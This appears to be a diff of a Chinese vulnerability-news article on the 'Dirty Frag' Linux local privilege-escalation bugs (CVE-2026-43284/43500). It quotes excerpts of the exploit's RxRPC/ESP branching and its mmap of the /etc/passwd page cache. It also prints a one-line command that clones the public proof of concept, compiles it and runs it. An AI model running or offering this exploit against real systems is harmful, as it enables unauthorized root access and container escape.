@@ -7,7 +7,7 @@ source: "gelusus/wxvl 公众号漏洞文库"
 whoami
                     whoami  船山信安   2026-05-14 04:10  
   
-# CVE-2026-43284/43500 Linux Dirty Frag 本地提权漏洞    
+# CVE-2026-43284/43500 Linux Dirty Frag 本地提权漏洞    
   
 韩国安全研究员Hyunwoo Kim公布了名为Dirty Frag的双漏洞组合，编号CVE-2026-43284和CVE-2026-43500。CVSS评分7.8，属于高危级别。  
   
@@ -33,28 +33,28 @@ main（
   
 ```
 // main() 中的核心分支逻辑
-if (force_rxrpc) {
-    rc = rxrpc_lpe_main(new_argc, co_argv);  // 强制走RxRPC路径
-} else if (force_esp) {
-    rc = su_lpe_main(new_argc, co_argv);     // 强制走xfrm-ESP路径
-} else {
-    // 默认：先试ESP，再试RxRPC兜底
-    rc = su_lpe_main(new_argc, co_argv);
-    if (!su_already_patched()) {
-        rc = rxrpc_lpe_main(new_argc, co_argv);  // ESP失败就换RxRPC
-    }
+if (force_rxrpc) {
+    rc = rxrpc_lpe_main(new_argc, co_argv);  // 强制走RxRPC路径
+} else if (force_esp) {
+    rc = su_lpe_main(new_argc, co_argv);     // 强制走xfrm-ESP路径
+} else {
+    // 默认：先试ESP，再试RxRPC兜底
+    rc = su_lpe_main(new_argc, co_argv);
+    if (!su_already_patched()) {
+        rc = rxrpc_lpe_main(new_argc, co_argv);  // ESP失败就换RxRPC
+    }
 }
 ```  
   
   
   
-### RxRPC路径（CVE-2026-43500） rxrpc_lpe_main()  
+### RxRPC路径（CVE-2026-43500） rxrpc_lpe_main()  
   
 ```
-int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
-if (dummy < 0) {
-    WARN("socket(AF_RXRPC): %s — module not loadable?", strerror(errno));
-    return 1;
+int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
+if (dummy < 0) {
+    WARN("socket(AF_RXRPC): %s — module not loadable?", strerror(errno));
+    return 1;
 }
 close(dummy);
 LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
@@ -63,10 +63,10 @@ LOG("rxrpc module autoloaded via dummy socket(AF_RXRPC)");
 #### /etc/passwd页缓存mmao  
   
 ```
-int rfd_ro = open(target_path, O_RDONLY);  // target_path默认是/etc/passwd
+int rfd_ro = open(target_path, O_RDONLY);  // target_path默认是/etc/passwd
 // ...
-void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
-LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)", target_path, map);
+void *map = mmap(NULL, 4096, PROT_READ, MAP_SHARED, rfd_ro, 0);
+LOG("mmap'd %s page-cache at %p (PROT_READ|MAP_SHARED)", target_path, map);
 ```  
   
 **言外之意**  
@@ -75,9 +75,9 @@ Dirty Frag是本地提权漏洞，这意味着攻击者必须先通过其他方�
   
 容器宿主机和Kubernetes节点更是高危区域。在容器化环境里，本地提权漏洞往往不只是拿到一个shell那么简单，还可能直接突破容器边界控制整台宿主机。  
   
-相关链接： https://github.com/V4bel/dirtyfrag   
+相关链接： https://github.com/V4bel/dirtyfrag   
 ```
-git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
+git clone https://github.com/V4bel/dirtyfrag.git && cd dirtyfrag && gcc -O0 -Wall -o exp exp.c -lutil && ./exp
 ```  
   
   
